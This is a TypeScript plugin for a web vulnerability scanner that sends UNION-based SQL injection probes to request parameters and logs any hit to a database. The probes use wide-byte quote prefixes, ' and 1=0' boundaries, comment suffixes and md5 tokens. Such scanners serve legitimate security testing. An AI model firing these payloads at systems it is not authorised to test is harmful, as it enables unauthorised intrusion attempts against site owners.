import { codec, common, Fuzz, HttpUtils } from '@24wings/core';
import { encodeHex } from 'jsr:@std/encoding@0.221/hex';
import { red } from 'jsr:@std/fmt/colors';
import db from '../../../app/web/db.ts';
import { VulnerabilityLevel } from '../../../app/web/db/vuln.ts';
const pluginName = 'sql-union-md5';
export async function endpoint(request: Request) {
  const fuzz = await Fuzz.fromRequest(request);
  const params = fuzz.getAllFuzzableParams();
  for (let param of params) {
    let prefix = sqlBuildPrefix(param.value as string);
    let suffix = [' -- ', ' # '];
    let [payloads, token] = unionPayloads('md5');

    let finished = false;
    for (let suf of suffix) {
      for (let pre of prefix) {
        if (finished) return;

        for (let p of payloads) {
          let finalPayload = pre + p + suf;
          const { request: payloadRequest, response } = await fuzz.sendModifiedRequest(
            Object.assign(param, { value: finalPayload }),
          );
          let respText = await response.text();
          if (respText.includes(token)) {
            finished = true;
            await db.tables.vuln.insertOne({
              url: payloadRequest.url,
              type: 'sqlInjection',
              level: VulnerabilityLevel.Medium,
              payload: finalPayload,
              requestRaw: await HttpUtils.dumpRequest(payloadRequest.clone()),
              responseRow: await HttpUtils.dumpResponse(response.clone()),
              pluginName,
            });
            // console.log(red('有漏洞'))
            return;
          }
        }
      }
    }
  }
}

/**
 * 生成一个计算表达式，用于检测强制类型转换是否生效
 * @param i 输入值
 * @returns 生成的计算表达式
 */
export function generateIntCastCheckingExpr(i: string | number): string {
  const paramInt = Number(i);
  const randInt = common.randomInt(100, 300);
  return `${randInt + paramInt}-${randInt}`;
}

/**
 * 生成 Union SQL 注入 payloads
 * @param checkType 检查类型
 * @returns [payloads 数组, token]
 */
export function unionPayloads(checkType: string): [string[], string] {
  const exprInfo = Fuzz.fuzzCalcExpr();
  let expr = exprInfo.expr;

  let token = exprInfo.result + '';
  let basicItem = expr;
  if (checkType.trim().toLowerCase() === 'md5') {
    basicItem = `md5(${expr})`;
    token = encodeHex(codec.md5(exprInfo.result + ''));
  }

  // Info(`USE UnionItem: ${basicItem} token: ${token}`);

  // base
  const payloads: string[] = [basicItem];
  const results: string[] = [];
  for (let i = 0; i < 16; i++) {
    payloads.push(basicItem);
    const realPayload = `union select ${payloads.join(',')}`;
    results.push(realPayload);
  }
  return [results, token];
}

/**
 * 构建 SQL 注入前缀
 * @param paramValue 参数值
 * @returns 前缀数组
 */
export function sqlBuildPrefix(paramValue: string): string[] {
  const pureInt = /^\d+$/.test(paramValue);

  const wideByte = String.fromCharCode(Math.floor(Math.random() * (254 - 129 + 1)) + 129);
  const prefix: string[] = [];

  const valueList = [paramValue];
  const boundaryList = [' ', ')', '))'];

  let formatString = '%s';
  if (!pureInt) {
    formatString += wideByte + "'";
    valueList.push(randomString(10));
  }
  formatString += '%s and 1=0 ';

  for (const v of valueList) {
    for (const b of boundaryList) {
      prefix.push(formatString.replace(/%s/g, (match, index) => index === 0 ? v : b));
    }
  }
  return prefix;
}

/**
 * 生成指定长度的随机字符串
 * @param length 字符串长度
 * @returns 随机字符串
 */
function randomString(length: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  return Array(length).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
}

export default { name: pluginName, version: '1.0.0', endpoint };
